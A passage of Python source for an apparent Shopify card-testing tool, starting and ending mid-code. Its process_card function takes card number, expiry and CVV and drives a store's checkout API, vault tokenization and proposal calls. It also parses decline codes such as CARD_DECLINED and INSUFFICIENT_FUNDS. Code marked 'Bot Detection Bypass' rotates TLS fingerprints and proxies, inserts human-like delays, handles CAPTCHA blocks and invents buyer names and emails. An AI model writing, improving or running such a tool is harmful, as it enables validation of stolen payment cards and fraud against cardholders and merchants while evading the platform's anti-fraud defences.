        if bracket_end != -1 and bracket_end + 1 < len(proxy_str) and proxy_str[bracket_end + 1] == ':':
            # Could be [::1]:port:user:pass — extract IPv6 part first
            ipv6_host = proxy_str[:bracket_end + 1]  # [::1]
            rest = proxy_str[bracket_end + 2:]  # after the colon after ]
            rest_parts = rest.split(':', 1)  # split port from optional auth
            if rest_parts:
                port = rest_parts[0]
                # If there's auth after port: [::1]:port:user:pass
                if len(rest_parts) > 1 and ':' in rest_parts[1]:
                    # Split user:pass — use rsplit to handle colon in password
                    auth_parts = rest_parts[1].rsplit(':', 1)
                    if len(auth_parts) == 2:
                        user, password = auth_parts
                        return f"http://{user}:{password}@{ipv6_host}:{port}"
                return f"http://{ipv6_host}:{port}"
        return None
    
    # Colon-separated formats (IPv4)
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    elif len(parts) >= 5:
        # ip:port:user:pass_with_colons — password may contain colons
        # Format: ip:port:user:pass:more:pass → first 2 are ip:port, rest is user:pass
        ip = parts[0]
        port = parts[1]
        user = parts[2]
        password = ':'.join(parts[3:])  # Rejoin remaining parts as password
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return None


def is_captcha_required(response_text):
    """Detect CAPTCHA blocks from Shopify GraphQL responses.
    
    BUG #16 FIX: Previous version checked for 'hcaptcha', 'h-captcha', 
    'captcha required', etc. which caused FALSE POSITIVES because the 
    GraphQL query string itself contains $captcha:CaptchaInput and the 
    response fragments contain ...on Captcha{provider challenge sitekey token}.
    These appear in EVERY normal NegotiationResultAvailable response (20KB+),
    so the old function detected "captcha" in normal responses and returned 
    CAPTCHA_REQUIRED for everything.
    
    Now we ONLY detect:
    1. CAPTCHA_REQUIRED as an explicit error code/message in the response
    2. CheckpointDenied as the __typename (Shopify's actual CAPTCHA block type)
    3. HTML challenge pages (not JSON responses)
    """
    if not response_text:
        return False
    
    # Only check for EXPLICIT CAPTCHA error codes from Shopify
    # These appear in the errors[] array or as top-level codes
    strict_indicators = [
        '"code":"CAPTCHA_REQUIRED"',
        '"code":"captcha_required"',
        '"message":"CAPTCHA_REQUIRED"',
        '"message":"captcha_required"',
    ]
    
    for indicator in strict_indicators:
        if indicator in response_text:
            return True
    
    # Check for CheckpointDenied __typename — this is Shopify's official 
    # CAPTCHA block response in GraphQL negotiate results
    if '"__typename":"CheckpointDenied"' in response_text:
        return True
    
    return False


async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, proxy=None
):
    last_error = "Request failed"
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(
                graphql_url, params=params, headers=headers,
                json=json_data, proxy=proxy, timeout=25
            )
            # UPDATE: Keep session token fresh - critical for avoiding GENERIC_ERROR
            new_sst = response.headers.get("x-checkout-one-session-token") or response.headers.get("X-Checkout-One-Session-Token")
            if new_sst: headers["x-checkout-one-session-token"] = new_sst
            new_sid = response.headers.get("x-checkout-web-source-id") or response.headers.get("X-Checkout-Web-Source-Id")
            if new_sid: headers["x-checkout-web-source-id"] = new_sid
            response_text = response.text
            
            # FIX: Validate response before returning.
            # Shopify may return HTML (login page, challenge page, error page)
            # instead of JSON when the session is invalid or the request is blocked.
            # Detect this early so the caller gets a clear error message.
            status_code = response.status_code
            content_type = response.headers.get('Content-Type', '')
            
            # If we get a non-2xx status, log it clearly
            if status_code >= 400:
                preview = response_text[:300].replace('\n', ' ').strip()
                # RATE-LIMIT FIX: For HTTP 429, use exponential backoff instead of fixed 1s
                if status_code == 429:
                    _429_backoff = 2.0 * (2 ** attempt)  # 2s, 4s, 8s...
                    _429_jitter = random.uniform(0.7, 1.3)
                    _429_delay = min(_429_backoff * _429_jitter, 15.0)
                    print(f"[rate-limit] GraphQL got HTTP 429, attempt {attempt+1}/{max_retries+1} in {_429_delay:.1f}s", file=sys.stderr)
                    if attempt < max_retries:
                        await asyncio.sleep(_429_delay)
                        continue
                    return response, response_text, False
                if attempt < max_retries:
                    await asyncio.sleep(1)
                    continue
                return response, response_text, False
            
            # If response is HTML instead of JSON, it's a block/redirect
            if 'text/html' in content_type and 'application/json' not in content_type:
                # Check if it's a redirect/challenge page
                if '<html' in response_text.lower() or '<!doctype' in response_text.lower():
                    title_match = re.search(r'<title>([^<]+)</title>', response_text, re.IGNORECASE)
                    title = title_match.group(1).strip() if title_match else "HTML page"
                    if 'login' in title.lower() or 'sign in' in title.lower():
                        last_error = f"BLOCKED: Checkout session redirected to login (HTTP {status_code})"
                    elif 'challenge' in title.lower() or 'captcha' in title.lower():
                        last_error = f"BLOCKED: Challenge page returned instead of JSON (HTTP {status_code})"
                    else:
                        last_error = f"BLOCKED: HTML response instead of JSON: {title} (HTTP {status_code})"
                    if attempt < max_retries:
                        await asyncio.sleep(1)
                        continue
                    return response, last_error, False
            
            # If response text is empty, retry or fail
            if not response_text or not response_text.strip():
                last_error = f"Empty response from GraphQL (HTTP {status_code})"
                if attempt < max_retries:
                    await asyncio.sleep(1)
                    continue
                return response, last_error, False
            
            # 3rd return value: True = valid JSON response received, False = error/block/timeout
            return response, response_text, True
        except asyncio.TimeoutError:
            last_error = "Request timed out"
            if attempt == max_retries:
                return None, last_error, False
            await asyncio.sleep(1)
        except (tls_requests.TLSError, tls_requests.HTTPError, OSError) as e:
            last_error = f"Request error: {str(e)}"
            if attempt == max_retries:
                return None, last_error, False
            await asyncio.sleep(1)
        except Exception as e:
            last_error = str(e)
            if attempt == max_retries:
                return None, last_error, False
            await asyncio.sleep(1)
    return None, last_error, False


async def fetch_products(domain, proxy_str=None):
    """Fetch cheapest available product variant from a Shopify store.
    
    Returns:
        tuple: (success: bool, data_or_error: dict|str)
            On success: (True, {'site': ..., 'price': ..., 'variant_id': ..., 'link': ...})
            On failure: (False, error_message_string)
    """
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        identifier = _pick_identifier()
        session = AsyncClient(client_identifier=identifier, http2=True, verify=True, timeout=10)
        try:
            resp = await session.get(f"{domain}/products.json", proxy=proxy)
            if resp.status_code != 200:
                return False, f"Site Error: HTTP {resp.status_code}"
            text = resp.text
            if "shopify" not in text.lower():
                return False, "Not a Shopify store"
            try:
                data = json.loads(text)
                result = data.get('products', [])
            except (json.JSONDecodeError, Exception):
                return False, "Invalid products response"
            if not result:
                return False, "No products found"
        finally:
            await session.aclose()

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        # FIX: European comma-decimal prices (e.g., "1,99" = €1.99)
                        if re.match(r'^\d+,\d{2}$', price.strip()):
                            price = float(price.replace(',', '.'))
                        else:
                            price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    # FIX: Skip free products ($0.00)
                    if price <= 0:
                        continue

                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        if isinstance(min_product, dict) and min_product.get('variant_id'):
            return True, min_product
        else:
            return False, "No valid products available"

    except (tls_requests.TLSError, tls_requests.HTTPError, OSError) as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"


_GENERIC_PAYMENT_CODES = {'GENERIC_ERROR', 'PAYMENT_FAILED', ''}

def _is_generic_payment_code(value):
    return str(value or '').strip().upper() in _GENERIC_PAYMENT_CODES

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    # Strip HTML tags if any leaked through
    message = re.sub(r'<[^>]+>', '', message).strip()
    if not message:
        return "UNKNOWN_ERROR"
    
    # Preserve diagnostic prefixes from our improved error handling
    DIAGNOSTIC_PREFIXES = [
        'PROPOSAL_BLOCKED:',
        'PROPOSAL_EMPTY:',
        'PROPOSAL_JSON_ERROR:',
        'SUBMIT_BLOCKED:',
        'SUBMIT_JSON_ERROR:',
        'PCI_VAULT_BLOCKED:',
        'PCI_VAULT_ERROR:',
        'BLOCKED:',
        'POLL_BLOCKED:',
        'POLL_JSON_ERROR:',
        'POLL_EMPTY:',
    ]
    for prefix in DIAGNOSTIC_PREFIXES:
        if message.startswith(prefix):
            return message[:120] if len(message) > 120 else message
    
    # Known Shopify error codes — return as-is without mangling.
    _KNOWN_CODES = {
        'CARD_DECLINED', 'INSUFFICIENT_FUNDS', 'EXPIRED_CARD', 'INVALID_CVC',
        'INCORRECT_NUMBER', 'INCORRECT_CVC', 'INCORRECT_ZIP', 'INCORRECT_ADDRESS',
        'PROCESSING_ERROR', 'CALL_ISSUER', 'PICK_UP_CARD', 'DO_NOT_HONOR',
        'CARD_NOT_SUPPORTED', 'TRY_AGAIN_LATER', 'INVALID_ACCOUNT',
        'INVALID_AMOUNT', 'INVALID_NUMBER', 'ALREADY_REFUNDED',
        'AUTHENTICATION_REQUIRED', 'TEST_MODE_LIVE_CARD',
        '3DS_REQUIRED', 'OTP_REQUIRED', 'ORDER_PLACED',
        'CAPTCHA_REQUIRED', 'GENERIC_ERROR', 'PAYMENT_FAILED',
        'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
    }
    msg_upper = message.strip().upper()
    if msg_upper in _KNOWN_CODES:
        return message.strip()
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                if match.upper() in _GENERIC_PAYMENT_CODES:
                    continue
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            if _is_generic_payment_code(first_word) and len(words) > 1:
                pass
            else:
                return first_word
    
    return message[:120]


def _first_non_empty_string(*values):
    for value in values:
        if value is None:
            continue
        text = str(value).strip()
        if text:
            return text
    return ''

def _extract_payment_error_response(error, _depth=0):
    """Return the most specific Shopify payment error available.

    Shopify often returns a generic top-level PaymentFailed.code while the
    actionable decline details live in nested/message fields. Prefer those
    details, but keep Shopify's actual generic code when it is all we received.
    """
    # FIX Bug #15: Prevent stack overflow from deeply nested error responses
    if _depth > 5:
        return 'UNKNOWN_PAYMENT_ERROR'

    if not isinstance(error, dict):
        return 'UNKNOWN_PAYMENT_ERROR'

    generic_code = ''

    # Step 1: Check direct code keys for specific (non-generic) codes
    candidate_keys = (
        'declineCode', 'decline_code', 'gatewayCode', 'gateway_code',
        'processorCode', 'processor_code', 'networkResponseCode',
        'network_response_code', 'reasonCode', 'reason_code',
        'errorCode', 'error_code', 'code',
    )
    for key in candidate_keys:
        value = _first_non_empty_string(error.get(key))
        if value and not _is_generic_payment_code(value):
            return value
        if value and _is_generic_payment_code(value) and not generic_code:
            generic_code = value

    # Step 2: Check nested containers (dicts) for specific codes
    nested_containers = (
        error.get('message'), error.get('paymentError'), error.get('gatewayResponse'),
        error.get('networkResponse'), error.get('processorResponse'), error.get('details'),
    )
    for nested in nested_containers:
        if isinstance(nested, dict):
            _nested_code = nested.get('code')
            if isinstance(_nested_code, str) and _nested_code.strip() and not _is_generic_payment_code(_nested_code):
                return _nested_code.strip()

            nested_response = _extract_payment_error_response(nested, _depth=_depth+1)
            if nested_response != 'UNKNOWN_PAYMENT_ERROR' and not _is_generic_payment_code(nested_response):
                return nested_response
            if _is_generic_payment_code(nested_response) and not generic_code:
                generic_code = nested_response

    # Step 3: Check string message fields for human-readable details
    _message_val = error.get('message')
    message = _first_non_empty_string(
        error.get('localizedMessage'), error.get('nonLocalizedMessage'),
        error.get('messageUntranslated'),
        _message_val if not isinstance(_message_val, dict) else None,
        error.get('description'), error.get('reason'), error.get('detail'),
    )
    if message and not _is_generic_payment_code(message):
        return message

    # Step 4: Fallback
    return generic_code or message or 'UNKNOWN_PAYMENT_ERROR'

def _payment_requires_offsite_action(error):
    if not isinstance(error, dict):
        return False
    return bool(error.get('hasOffsiteRedirect') or error.get('hasOffsitePaymentMethod'))


async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
    """Process a credit card checkout using the new Storefront API cartCreate flow.
    
    NEW FLOW (replaces old homepage → cart → checkout HTML flow):
    1. GET /products.json → find product_id + price
    2. GET homepage → extract site_key (accessToken)
    3. POST /api/unstable/graphql.json (cartCreate mutation) → get checkout_url
    4. GET checkout_url?auto_redirect=false → extract payment tokens, DMT, etc.
    5. POST checkout.pci.shopifyinc.com/sessions → tokenize card → sessionid
    6. POST /checkouts/unstable/graphql (Proposal 1st call) → get tax2, DMT
    7. POST /checkouts/unstable/graphql (Proposal 2nd call) → get handle, amount, tax3, total
    8. POST /checkouts/unstable/graphql (SubmitForCompletion) → get receipt_id
    9. POST /checkouts/unstable/graphql (PollForReceipt) → get final result
    
    Returns:
        tuple: (success: bool, message: str, gateway: str, total_price: str, currency: str)
    """
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'

    try:
        # --- Bot Detection Bypass: TLS identifier + Client Hints + Proxy Rotation ---
        identifier = _pick_identifier()
        hints = _get_client_hints(identifier)
        proxy = _init_proxy_rotator(proxy_str)
        
        # Determine mobile status based on UA
        mobile = '?1' if any(x in hints['ua'] for x in ["Android", "iPhone", "iPad", "Mobile"]) else '?0'
        clienthint = 'Android' if 'Android' in hints['ua'] else ('macOS' if 'Macintosh' in hints['ua'] else 'Windows')
        
        parsed = urlparse(ourl)
        domain = parsed.netloc
        
        # Sanitize variant_id — extract numeric ID from full GID
        if variant_id:
            _gid_match = re.match(r'^gid://shopify/ProductVariant/(\d+)$', str(variant_id))
            if _gid_match:
                variant_id = _gid_match.group(1)
            else:
                variant_id = str(variant_id).strip()
        
        # Step 1: Fetch product info
        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            success, data = info
            if not success:
                return False, data, gateway, total_price, currency
            variant_id = data['variant_id']
            price = float(data['price'])
        else:
            price = None  # Will be determined from products.json
        
        # Create dedicated session per checkout
        session = AsyncClient(
            client_identifier=identifier,
            http2=True,
            verify=not proxy,
            timeout=30,
        )
        
        try:
            # Step 1b: GET /products.json to get product_id and price
            product_headers = {
                'User-Agent': hints['ua'],
            }
            product_resp, _ = await retry_on_429(
                lambda: session.get(f"{ourl}/products.json", headers=product_headers, proxy=proxy, timeout=10, allow_redirects=True),
                step_name="products", max_retries=2, base_delay=3.0, max_delay=12.0
            )
            if product_resp.status_code != 200:
                return False, f"Products fetch failed: HTTP {product_resp.status_code}", gateway, total_price, currency
            
            try:
                products_data = json.loads(product_resp.text)
                products_list = products_data.get('products', [])
            except json.JSONDecodeError:
                return False, "Invalid products JSON", gateway, total_price, currency
            
            # Find the cheapest available product (or match the given variant_id)
            product_id = None
            if price is None:
                min_price = float('inf')
                for product in products_list:
                    for variant in product.get('variants', []):
                        if not variant.get('available', True):
                            continue
                        try:
                            v_price = float(variant.get('price', '0'))
                            if v_price <= 0:
                                continue
                            if str(variant['id']) == str(variant_id):
                                product_id = variant['id']
                                price = v_price
                                break
                            if v_price < min_price:
                                min_price = v_price
                                _best_id = variant['id']
                        except (ValueError, TypeError):
                            continue
                    if product_id:
                        break
                if not product_id and min_price != float('inf'):
                    product_id = _best_id
                    price = min_price
                elif not product_id:
                    return False, "No valid products available", gateway, total_price, currency
            else:
                # variant_id was provided, find matching product_id
                for product in products_list:
                    for variant in product.get('variants', []):
                        if str(variant['id']) == str(variant_id):
                            product_id = variant['id']
                            if price is None:
                                try:
                                    price = float(variant.get('price', '0'))
                                except (ValueError, TypeError):
                                    price = 0.01
                            break
                    if product_id:
                        break
                if not product_id:
                    product_id = int(variant_id)
            
            await human_delay(step_name="products")
            
            # Step 2: GET homepage → extract site_key (accessToken)
            try:
                home_resp = await session.get(ourl, headers={
                    **product_headers,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                }, proxy=proxy, allow_redirects=True, timeout=10)
                site_key = extract_between(home_resp.text, '"accessToken":"', '"')
            except Exception:
                site_key = None
            
            if not site_key:
                return False, "Failed to extract Storefront API access token", gateway, total_price, currency
            
            await human_delay(step_name="homepage")
            
            # Step 3: POST /api/unstable/graphql.json (cartCreate mutation)
            storefront_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': ourl,
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-mobile': mobile,
                'sec-ch-ua-platform': f'"{clienthint}"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': hints['ua'],
                'x-sdk-variant': 'portable-wallets',
                'x-shopify-storefront-access-token': site_key,
                'x-start-wallet-checkout': 'true',
                'x-wallet-name': 'MoreOptions'
            }
            
            cart_create_params = {'operation_name': 'cartCreate'}
            cart_create_data = {
                'query': MUTATION_CART_CREATE,
                'variables': {
                    'input': {
                        'lines': [
                            {
                                'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
                                'quantity': 1,
                                'attributes': [],
                            },
                        ],
                        'discountCodes': [],
                    },
                    'country': 'US',
                    'language': 'EN',
                },
            }
            
            cart_create_resp, _ = await retry_on_429(
                lambda: session.post(
                    f'{ourl}/api/unstable/graphql.json',
                    params=cart_create_params, headers=storefront_headers,
                    json=cart_create_data, proxy=proxy, timeout=20, allow_redirects=True
                ),
                step_name="cart_create", max_retries=2, base_delay=3.0, max_delay=12.0
            )
            
            if cart_create_resp.status_code != 200:
                return False, f"CartCreate failed: HTTP {cart_create_resp.status_code}", gateway, total_price, currency
            
            try:
                cart_resp_data = json.loads(cart_create_resp.text)
                cart_result = cart_resp_data.get("data", {}).get("result", {})
                cart_obj = cart_result.get("cart")
                
                if cart_obj is None:
                    # Cart is null — check for errors
                    cart_errors = cart_result.get("errors", [])
                    if cart_errors:
                        err_msgs = [e.get("message", str(e)) for e in cart_errors[:3]]
                        return False, f"CartCreate error: {'; '.join(err_msgs)}", gateway, total_price, currency
                    # Check top-level GraphQL errors
                    top_errors = cart_resp_data.get("errors", [])
                    if top_errors:
                        err_msgs = [e.get("message", str(e)) for e in top_errors[:3]]
                        return False, f"CartCreate GraphQL error: {'; '.join(err_msgs)}", gateway, total_price, currency
                    return False, "CartCreate returned null cart (no errors)", gateway, total_price, currency
                
                checkout_url = cart_obj.get("checkoutUrl")
                if not checkout_url:
                    return False, "CartCreate returned no checkoutUrl", gateway, total_price, currency
            except (json.JSONDecodeError, KeyError, TypeError) as e:
                preview = cart_create_resp.text[:300]
                return False, f"CartCreate parse error: {str(e)} (preview: {preview[:100]})", gateway, total_price, currency
            
            await human_delay(step_name="cart_create")
            
            # Step 4: GET checkout_url?auto_redirect=false → extract tokens
            checkout_get_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-mobile': mobile,
                'sec-ch-ua-platform': f'"{clienthint}"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': mobile,
                'upgrade-insecure-requests': '1',
                'user-agent': hints['ua'],
            }
            
            checkout_resp, _ = await retry_on_429(
                lambda: session.get(
                    checkout_url, headers=checkout_get_headers,
                    params={'auto_redirect': 'false'},
                    proxy=proxy, allow_redirects=True, timeout=20
                ),
                step_name="checkout_page", max_retries=2, base_delay=3.0, max_delay=12.0
            )
            
            if checkout_resp.status_code != 200:
                return False, f"Checkout page failed: HTTP {checkout_resp.status_code}", gateway, total_price, currency
            
            checkout_text = checkout_resp.text
            
            # Extract all tokens from checkout HTML
            paymentMethodIdentifier = extract_between(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
            stable_id = extract_between(checkout_text, "stableId&quot;:&quot;", "&quot")
            queue_token = extract_between(checkout_text, "queueToken&quot;:&quot;", "&quot")
            currencyCode = extract_between(checkout_text, "currencyCode&quot;:&quot;", "&quot")
            countryCode = extract_between(checkout_text, "countryCode&quot;:&quot;", "&quot")
            
            x_checkout_one_session_token = (
                extract_between(checkout_text, 'name="serialized-sessionToken" content="', '"')
                or extract_between(checkout_text, 'serialized-session-token" content="&quot;', '&quot')
                or extract_between(checkout_text, '"serializedSessionToken":"', '"')
                or extract_between(checkout_text, 'data-session-token="', '"')
            )
            
            # FIX: Clean up HTML entity encoding from extracted token
            if x_checkout_one_session_token:
                x_checkout_one_session_token = x_checkout_one_session_token.replace('&quot;', '').strip('"').strip()
            
            # FIX: If still not found, try JWT extraction from redirect URLs
            if not x_checkout_one_session_token and hasattr(checkout_resp, 'history') and checkout_resp.history:
                for _r_url in [str(r.url) for r in checkout_resp.history]:
                    for _param in ['shop_pay_token', 'token', 'checkout_token', 'session_token']:
                        _jwt_match = re.search(rf'[?&]{_param}=([^&]+)', _r_url)
                        if _jwt_match:
                            _jwt_str = _jwt_match.group(1)
                            _jwt_parts = _jwt_str.split('.')
                            if len(_jwt_parts) >= 2:
                                _jwt_payload = _jwt_parts[1] + '=' * ((4 - len(_jwt_parts[1]) % 4) % 4)
                                try:
                                    _jwt_decoded = json.loads(base64.urlsafe_b64decode(_jwt_payload))
                                    x_checkout_one_session_token = (
                                        _jwt_decoded.get('session_token') or
                                        _jwt_decoded.get('checkout_session_token') or
                                        _jwt_decoded.get('sst') or
                                        _jwt_decoded.get('token')
                                    )
                                    if x_checkout_one_session_token:
                                        print(f'[SESSION_TOKEN] Extracted via JWT from redirect ({_param})', file=sys.stderr)
                                        break
                                except Exception:
                                    pass
                    if x_checkout_one_session_token:
                        break
            
            token = (
                extract_between(
                    checkout_text,
                    'serialized-source-token" content="&quot;',
                    '&quot'
                ) or extract_between(checkout_text, '"serializedSourceToken":"', '"')
                or extract_between(checkout_text, 'data-source-token="', '"')
            )
            
            # Web build hash - try to extract from HTML, fallback to known value
            web_build = extract_between(
                checkout_text,
                'serialized-client-bundle-info" content="{&quot;browsers&quot;:&quot;latest&quot;,&quot;format&quot;:&quot;es&quot;,&quot;locale&quot;:&quot;en&quot;,&quot;sha&quot;:&quot;',
                '&quot'
            )
            if not web_build:
                # Try alternate extraction
                _bundle_match = re.search(r'"sha":"([a-f0-9]{40})"', checkout_text)
                if _bundle_match:
                    web_build = _bundle_match.group(1)
            if not web_build:
                web_build = 'a5ffb15727136fbf537411f8d32d7c41fb371075'
            
            tax1 = extract_between(checkout_text, "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot")
            _gateway_raw = extract_between(checkout_text, 'extensibilityDisplayName&quot;:&quot;', '&quot')
            if _gateway_raw == "Shopify Payments":
                gateway = "Normal"
            elif _gateway_raw:
                gateway = _gateway_raw
            else:
                gateway = "Unknown"
            
            # DMT (Delivery Method Types) - critical for NONE vs SHIPPING
            DMT = extract_between(checkout_text, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;')
            if DMT:
                DMT = DMT.replace('"', '')
            
            # Select address based on URL/currency/country
            addr = pick_addr(ourl, cc=currencyCode, rc=countryCode)
            country_code = addr["countryCode"]
            if currencyCode:
                currency = currencyCode
            elif addr.get("currencyCode"):
                currency = addr["currencyCode"]
            else:
                currency = "USD"
            
            firstName, lastName = Utils.get_random_name()
            email = Utils.generate_email(firstName, lastName)
            phone = addr["phone"]
            street = addr["address1"]
            city = addr["city"]
            state = addr["zoneCode"]
            s_zip = addr["postalCode"]
            
            if not paymentMethodIdentifier:
                return False, "No payment method identifier found in checkout page", gateway, total_price, currency
            if not x_checkout_one_session_token:
                return False, "Failed to extract session token from checkout page", gateway, total_price, currency
            
            await human_delay(step_name="checkout_page")
            
            # Step 5: PCI Vault — tokenize card
            vault_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': f'https://checkout.pci.shopifyinc.com/build/{web_build}/number-ltr.html?identifier=&locationURL={checkout_url}',
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-mobile': mobile,
                'sec-ch-ua-platform': f'"{clienthint}"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': hints['ua'],
            }
            
            vault_payload = {
                'credit_card': {
                    'number': cc,
                    'month': mes,
                    'year': ano,
                    'verification_value': cvv,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': f'{firstName} {lastName}',
                },
                'payment_session_scope': domain,
            }
            
            _PCI_ENDPOINTS = [
                f'https://checkout.pci.shopifyinc.com/sessions',
            ]
            
            await human_delay(min_sec=1.0, max_sec=2.0, step_name="pci_vault")
            
            sessionid = None
            for _ep_url in _PCI_ENDPOINTS:
                try:
                    vault_resp, _ = await retry_on_429(
                        lambda _u=_ep_url: session.post(_u, json=vault_payload, headers=vault_headers, proxy=proxy, timeout=12),
                        step_name="pci_vault", max_retries=2, base_delay=3.0, max_delay=12.0
                    )
                    if vault_resp and vault_resp.status_code in (200, 201):
                        try:
                            token_data = json.loads(vault_resp.text)
                            sessionid = token_data.get('id') or token_data.get('session_id')
                            if sessionid:
                                break
                        except json.JSONDecodeError:
                            pass
                except Exception as _ep_err:
                    print(f"[PCI_VAULT] Error on {_ep_url}: {_ep_err}", file=sys.stderr)
                    continue
            
            if not sessionid:
                return False, "PCI_VAULT_ERROR: Failed to get payment token", gateway, total_price, currency
            
            # Step 6: Build checkout web API headers for Proposal/Submit/Poll
            checkout_web_headers = {
                'authority': domain,
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': ourl,
                'referer': ourl,
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-mobile': mobile,
                'sec-ch-ua-platform': f'"{clienthint}"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': hints['ua'],
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-build-id': web_build,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': token or '',
            }
            
            graphql_url = f'{ourl}/checkouts/unstable/graphql'
            
            # Step 6: 1st Proposal call → get tax2, DMT
            proposal1_params = {'operationName': 'Proposal'}
            proposal1_data = {
                'query': QUERY_PROPOSAL,
                'variables': {
                    'sessionInput': {
                        'sessionToken': x_checkout_one_session_token,
                    },
                    'queueToken': queue_token or '',
                    'discounts': {
                        'lines': [],
                        'acceptUnexpectedDiscounts': True,
                    },
                    'delivery': {
                        'deliveryLines': [
                            {
                                'destination': {
                                    'partialStreetAddress': {
                                        'address1': street,
                                        'city': city,
                                        'countryCode': country_code,
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                        'oneTimeUse': False,
                                    },
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True},
                                    },
                                    'options': {},
                                },
                                'targetMerchandiseLines': {'any': True},
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': False,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': stable_id or '1',
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f"{price}",
                                        'currencyCode': currency,
                                    },
                                },
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            },
                        ],
                    },
                    'memberships': {'memberships': []},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street,
                                'city': city,
                                'countryCode': country_code,
                                'postalCode': s_zip,
                                'firstName': firstName,
                                'lastName': lastName,
                                'zoneCode': state,
                                'phone': phone,
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': currency,
                            'countryCode': country_code,
                        },
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [],
                        'shopPayOptInPhone': {
                            'countryCode': country_code,
                        },
                        'rememberMe': False,
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {
                                'amount': f"{tax1 or '0'}",
                                'currencyCode': currency,
                            },
                        },
                        'proposedTotalIncludedAmount': None,
